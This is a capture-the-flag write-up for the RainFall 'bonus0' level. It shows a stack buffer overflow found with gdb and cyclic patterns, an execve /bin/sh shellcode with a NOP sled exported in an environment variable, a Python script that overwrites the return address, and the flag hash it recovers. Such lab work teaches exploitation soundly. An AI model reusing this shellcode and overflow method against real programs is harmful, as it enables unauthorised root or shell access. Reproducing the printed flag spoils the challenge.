
```
bonus0@RainFall:~$ objdump -t bonus0 | grep text
080484b4 g     F .text	0000006a              p
0804851e g     F .text	00000086              pp
080485a4 g     F .text	00000028              main
```

```
bonus0@RainFall:~$ ./bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��
Segmentation fault (core dumped)
```
using a recognizable pattern
```
cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
AAAAAAAAAAAAAAAAAAAAaaaabaaacaaadaaaeaaa�� aaaabaaacaaadaaaeaaa��

Program received signal SIGSEGV, Segmentation fault.
0x64616161 in ?? ()
```

offset

```
➜  Desktop cyclic -l 0x64616161
9
```


```

   0x0804852e <+16>:	lea    -0x30(%ebp),%eax
   0x08048531 <+19>:	mov    %eax,(%esp)
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax
   0x08048544 <+38>:	mov    %eax,(%esp)
   0x08048547 <+41>:	call   0x80484b4 <p>
   
                +----EBP(pp)--------+
                +                   +                            
                +-------------------+                            
                +       ebx         +                            
                +-------------------+ -8                         
                +       b2[20]      +                            
                +-------------------+ -28  0x1c                      
                +       b1[20]      +                            
                +-------------------+ -48  0x30    
```
manually
```
pp
=> 0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>

(gdb) x/40wx $esp
0xbffff660:	0xbffff6d6	0xbffff688	0x00000000	0xb7fd0ff4
0xbffff670:	0xbffff6be	0xbffff6bf	0x00000001	0xb7ec3c49
0xbffff680:	0xbffff6bf	0xbffff6be	0x41414141	0x00000000
0xbffff690:	0x00000000	0x00000000	0x00000000	0x42424242

0xbffff69c - 0xbffff688 = 20
```

```
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
=> 0x0804859d <+127>:	add    $0x50,%esp

0xbffff6d0:	0xb7fd13e4	0x41410016	0x42204141	0x00424242
                          AA          AA B      BBB
                          
(gdb) i r
eax            0xbffff6d6	= "AAAA BBBB"
ecx            0x42424242	
edx            0x4	4                          
```

```
export shellcode=$(python -c 'print "\x90"*400 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

pick a random addr as starting of shellcode
```
(gdb) x/600wx $esp
.
.
.
     0xbffffd60:	0x90903d65	0x90909090	0x90909090	0x90909090
     0xbffffd70:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffd80:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffd90:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffda0:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffdb0:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffdc0:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffdd0:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffde0:	0x90909090	0x90909090	0x90909090	0x90909090
==>  0xbffffdf0:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffe00:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffe10:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffe20:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffe30:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffe40:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffe50:	0x90909090	0x90909090	0x90909090	0x90909090
     0xbffffe60:	0x90909090	0x90909090	0x90909090	0x90909090

```

```
bonus0@RainFall:~$ nano /var/tmp/exploit.py

  import struct

  shellcode = struct.pack("I", 0xbffffdf0)

  #b1 = "A"*20
  b2 = "B" * 9  + shellcode + "B"*7
  #print b1
  print b2

```


```
bonus0@RainFall:~$ python /var/tmp/exploit.py > /var/tmp/exp

(python -c 'print "A" * 20'; cat /var/tmp/exp; cat) | ./bonus0

cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

```








